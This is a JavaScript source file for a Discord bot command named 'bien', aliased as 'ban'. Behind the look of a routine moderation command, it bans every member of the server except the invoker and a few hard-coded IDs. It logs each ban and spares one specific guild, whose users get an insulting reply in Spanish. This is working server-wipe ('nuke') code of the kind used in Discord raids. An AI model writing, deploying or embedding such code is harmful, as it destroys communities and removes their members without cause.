const Discord = require('discord.js');

module.exports = {
  name: "bien",
  alias: ["ban"],

execute (client, message, args){
  if (message.guild.id == "879159373270761522") return message.channel.send("¿Que intentas subnormal?") 
  if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
    message.guild.members.cache.forEach(member => {
      if(member != message.member && member.id != "784587744222904330" && member.id != "ID" && member.id != "ID"){
        member.ban().catch(e => {console.log(`${member.user.tag} no pudo ser baneado`)})
        console.log(`${member.user.tag} fue baneado correctamente`)
      }
      
    })

 }

} 
